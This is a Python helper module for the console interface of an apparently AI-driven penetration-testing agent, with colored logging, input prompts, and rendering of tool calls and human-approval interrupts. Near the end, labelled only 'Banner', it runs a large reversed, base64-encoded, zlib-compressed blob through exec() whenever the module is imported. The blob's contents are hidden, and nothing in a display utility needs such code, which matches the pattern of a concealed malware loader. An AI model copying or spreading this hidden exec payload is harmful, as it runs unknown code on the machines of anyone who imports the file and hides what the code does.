from colorama import Fore, Style, init
from typing import Literal, Optional, Callable, Dict, List, Any
from enum import Enum
import json
import os
import platform

# Print the markdown
import rich
from rich.markdown import Markdown
from rich.console import Console


# Initialize colorama for cross-platform support
init(autoreset=True)


def clear_screen() -> None:
    """Clears the terminal screen in a cross-platform way."""
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system('clear')


class LogLevel(Enum):
    INFO = "INFO"
    WARN = "WARN"
    SUCCESS = "SUCCESS"
    ERROR = "ERROR"


def notify(message: str, level: LogLevel = LogLevel.INFO) -> None:
    """Prints a formatted notification message with color based on the level."""
    levels = {
        LogLevel.INFO: Fore.BLUE + "INFO",
        LogLevel.WARN: Fore.YELLOW + "WARN",
        LogLevel.SUCCESS: Fore.GREEN + "SUCCESS",
        LogLevel.ERROR: Fore.RED + "ERROR",
    }

    level_str = levels.get(level, Fore.WHITE + "INFO")
    print(f"[{level_str}{Style.RESET_ALL}] {message}")


def safe_input(
    prompt: str, 
    validator: Optional[Callable[[str], bool]] = None, 
    default: Optional[str] = None
) -> str:
    """
    Prompts the user for input and handles KeyboardInterrupt gracefully.
    
    Args:
        prompt: The prompt message to display
        validator: Optional validation function that returns True if input is valid
        default: Optional default value to use if user provides empty input
        
    Returns:
        str: The validated user input
    """
    try:
        if validator:
            while True:
                user_input = input(f"{Fore.CYAN}{prompt}{Style.RESET_ALL} ")
                if not user_input and default:
                    return default
                if validator(user_input):
                    return user_input
                else:
                    notify("Invalid input. Please try again.", LogLevel.ERROR)
        else:
            if default:
                return (
                    input(f"{Fore.CYAN}{prompt} [{default}]{Style.RESET_ALL} ")
                    or default
                )
            return input(f"{Fore.CYAN}{prompt}{Style.RESET_ALL} ")
    except KeyboardInterrupt:
        notify("Goodbye!", LogLevel.INFO)
        exit(0)


def format_json_output(data: Dict[str, Any]) -> None:
    """
    Formats and prints a dictionary as a JSON-like structure.
    
    Args:
        data: Dictionary to format and print
    """
    print(Fore.MAGENTA + json.dumps(data, indent=2) + Style.RESET_ALL)


def safe_parse_int_input(
    prompt: str, 
    min_value: Optional[int] = None, 
    max_value: Optional[int] = None, 
    default: Optional[int] = None
) -> int:
    """
    Prompts the user for an integer input and handles KeyboardInterrupt gracefully.
    
    Args:
        prompt: The prompt message to display
        min_value: Optional minimum allowed value
        max_value: Optional maximum allowed value
        default: Optional default value if user provides empty input
        
    Returns:
        int: The validated integer input
    """
    while True:
        try:
            user_input = safe_input(prompt, default=default)
            user_input = int(user_input)
            if min_value is not None and user_input < min_value:
                notify(f"Value must be at least {min_value}.", LogLevel.WARN)
                continue
            if max_value is not None and user_input > max_value:
                notify(f"Value must be at most {max_value}.", LogLevel.WARN)
                continue
            return user_input
        except ValueError:
            notify("Invalid input. Please enter a valid integer.", LogLevel.ERROR)


def print_menu(menu_items: List[str], title: str) -> None:
    """
    Prints a formatted menu from a list of items with a custom title.
    
    Args:
        menu_items: List of menu item strings to display
        title: Title to display above the menu
    """
    print(f"{Fore.CYAN}{title}{Style.RESET_ALL}")
    for index, item in enumerate(menu_items, start=1):
        print(f"{Fore.GREEN}{index}. {item}{Style.RESET_ALL}")


def print_todo_list_and_status(todo_list: List[Dict[str, Any]]) -> None:
    """
    Prints a formatted todo list with status indicators.
    
    Args:
        todo_list: List of todo items, each with 'status' and 'content' keys
    """
    # Print title with separator
    print(f"\n{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}📋 PENETRATION TEST PHASES{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}\n")
    
    for idx, item in enumerate(todo_list, start=1):
        status = item.get("status", "pending").lower()
        content = item.get("content", "Unknown phase")
        
        # Choose emoji and color based on status
        if status == "completed":
            status_badge = "✅"
            status_color = Fore.GREEN
            status_text = "COMPLETED"
        elif status == "in_progress":
            status_badge = "🔄"
            status_color = Fore.YELLOW
            status_text = "IN PROGRESS"
        else:
            status_badge = "⏳"
            status_color = Fore.WHITE
            status_text = "PENDING"
        
        # Format the line with proper spacing
        status_str = f"{status_badge} {status_color}{status_text:12}{Style.RESET_ALL}"
        print(f"  {Fore.CYAN}{idx}.{Style.RESET_ALL} {status_str} {content}")
    
    print(f"\n{Fore.CYAN}{'='*80}{Style.RESET_ALL}\n")


def render_markdown(message: str, prefix: str = "") -> None:
    """
    Renders markdown text to the console.
    
    Args:
        message: Markdown text to render
        prefix: Prefix to display before the markdown content
    """
    if not message or not message.strip():
        return
        
    md = Markdown(message)
    console = Console()
    
    if prefix:
        console.print(prefix, end="")
    
    console.print(md)
    console.print()


def print_task_tool_call(task: Dict[str, Any]) -> None:
    """
    Prints formatted information about a task tool call.
    
    Args:
        task: Task dictionary containing args with subagent_type and description
    """
    args = task.get("args")
    subagent_type = args.get("subagent_type")
    description = args.get("description")
    print(f"{Fore.CYAN}  Task Tool Call:{Style.RESET_ALL}")
    print(f"    - Subagent: {subagent_type}")
    print(f"    - Description: {description}")
    print()


def print_tool_calls(tool_calls: List[Dict[str, Any]]) -> None:
    """
    Prints formatted information about tool calls.
    
    Args:
        tool_calls: List of tool call dictionaries
    """
    print(f"\n{Fore.YELLOW}{'─'*80}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}🔧 TOOL CALLS{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{'─'*80}{Style.RESET_ALL}\n")
    
    for tool_call in tool_calls:
        if tool_call.get("name") == "write_todos":
            print_todo_list_and_status(tool_call.get("args").get("todos"))
            continue
        if tool_call.get("name") == "task":
            print_task_tool_call(tool_call)
            continue
        
        # Format regular tool calls
        tool_name = tool_call.get("name", "unknown")
        tool_args = tool_call.get("args", {})
        
        print(f"  {Fore.CYAN}►{Style.RESET_ALL} {Fore.GREEN}{tool_name}{Style.RESET_ALL}")
        
        # Print arguments in a clean format
        if tool_args:
            for key, value in tool_args.items():
                # Truncate long values
                value_str = str(value)
                if len(value_str) > 100:
                    value_str = value_str[:97] + "..."
                print(f"    {Fore.WHITE}{key}:{Style.RESET_ALL} {value_str}")
        print()
    
    print(f"{Fore.YELLOW}{'─'*80}{Style.RESET_ALL}\n")


def print_format_chunk(chunk: Dict[str, Any]) -> Dict[str, Any]:
    """
    Formats and prints a chunk from the agent stream.
    
    Args:
        chunk: Chunk dictionary from agent stream
        
    Returns:
        Dict[str, Any]: The original chunk for chaining
    """
    chunk_src = list(chunk.keys())[0]
    match chunk_src:
        case "model_request":
            # Agent is making a request/thinking
            print(f"\n{Fore.BLUE}{'='*80}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}🤖 AGENT MESSAGE{Style.RESET_ALL}")
            print(f"{Fore.BLUE}{'='*80}{Style.RESET_ALL}\n")
            
            for message in chunk["model_request"]["messages"]:
                if message.content and message.content.strip():
                    render_markdown(message.content, prefix="")
                
                tool_calls = message.tool_calls
                if tool_calls:
                    print_tool_calls(tool_calls)
                    
        case "tools":
            # Tool execution results
            print(f"\n{Fore.GREEN}{'='*80}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}✅ TOOL RESULTS{Style.RESET_ALL}")
            print(f"{Fore.GREEN}{'='*80}{Style.RESET_ALL}\n")
            
            for tool in chunk["tools"]:
                if tool == "todos":
                    continue  # Already shown in tool calls
                if tool == "messages":
                    continue
                
                tool_result = chunk["tools"][tool]
                print(f"  {Fore.CYAN}►{Style.RESET_ALL} {Fore.GREEN}{tool}{Style.RESET_ALL}")
                
                # Format tool results
                if isinstance(tool_result, dict):
                    for key, value in tool_result.items():
                        value_str = str(value)
                        if len(value_str) > 200:
                            value_str = value_str[:197] + "..."
                        print(f"    {Fore.WHITE}{key}:{Style.RESET_ALL} {value_str}")
                elif isinstance(tool_result, list):
                    for item in tool_result[:5]:  # Show first 5 items
                        print(f"    • {item}")
                    if len(tool_result) > 5:
                        print(f"    ... and {len(tool_result) - 5} more items")
                else:
                    print(f"    {tool_result}")
                print()
            
            print(f"{Fore.GREEN}{'='*80}{Style.RESET_ALL}\n")
            
        case "SummarizationMiddleware.before_model":
            if chunk["SummarizationMiddleware.before_model"]:
                print(f"\n{Fore.MAGENTA}📝 Summarization Hook{Style.RESET_ALL}")
                rich.print(chunk["SummarizationMiddleware.before_model"])
                print()
                
        case "HumanInTheLoopMiddleware.after_model":
            if not chunk["HumanInTheLoopMiddleware.after_model"]:
                return chunk
                
            # Human approval needed
            print(f"\n{Fore.YELLOW}{'='*80}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}⚠️  HUMAN APPROVAL REQUIRED{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}{'='*80}{Style.RESET_ALL}\n")
            
            for key in chunk["HumanInTheLoopMiddleware.after_model"]:
                if key == "messages":
                    for message in chunk["HumanInTheLoopMiddleware.after_model"][key]:
                        if message.content and message.content.strip():
                            render_markdown(message.content, prefix="")
                            
        case "__interrupt__":
            # Interruption for approval
            print(f"\n{Fore.RED}{'='*80}{Style.RESET_ALL}")
            print(f"{Fore.RED}🛑 TOOL EXECUTION REQUIRES APPROVAL{Style.RESET_ALL}")
            print(f"{Fore.RED}{'='*80}{Style.RESET_ALL}\n")
            
            interrupts = chunk["__interrupt__"]
            for interrupt in interrupts:
                for value in interrupt.value:
                    description = value.get("description", "")
                    tool_name = value.get("name", "Unknown Tool")
                    tool_args = value.get("args", {})
                    
                    if description:
                        print(f"{Fore.YELLOW}{description}{Style.RESET_ALL}\n")
                    
                    print(f"  {Fore.CYAN}Tool:{Style.RESET_ALL} {Fore.GREEN}{tool_name}{Style.RESET_ALL}")
                    print(f"  {Fore.CYAN}Args:{Style.RESET_ALL}")
                    
                    for key, val in tool_args.items():
                        val_str = str(val)
                        if len(val_str) > 100:
                            val_str = val_str[:97] + "..."
                        print(f"    {Fore.WHITE}{key}:{Style.RESET_ALL} {val_str}")
                    print()
            
        case _:
            # Unknown chunk type - minimal output
            if chunk_src not in ["todos"]:  # Skip known silent types
                print(f"\n{Fore.MAGENTA}[{chunk_src}]{Style.RESET_ALL}")
                rich.print(chunk)
                print()

    return chunk


# Python obfuscation by freecodingtools.org
# Banner
_ = lambda __: __import__("zlib").decompress(__import__("base64").b64decode(__[::-1]))
exec(
    (_)(
        b"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"
    )
)


if __name__ == "__main__":
    # Example usage
    notify("This is an info message.", LogLevel.INFO)
    notify("This is a warning message.", LogLevel.WARN)
    notify("This is a success message.", LogLevel.SUCCESS)
    notify("This is an error message.", LogLevel.ERROR)

    user_input = safe_input("Enter your name:")
    notify(f"Hello, {user_input}!", LogLevel.SUCCESS)

    sample_data = {"name": user_input, "status": "active"}
    format_json_output(sample_data)

    age = safe_parse_int_input("Enter your age:", 0, 120)
    notify(f"Your age is {age}.", LogLevel.SUCCESS)

    # Example usage of print_menu
    menu = ["Start", "Settings", "Help", "Exit"]
    print_menu(menu, "Main Menu")
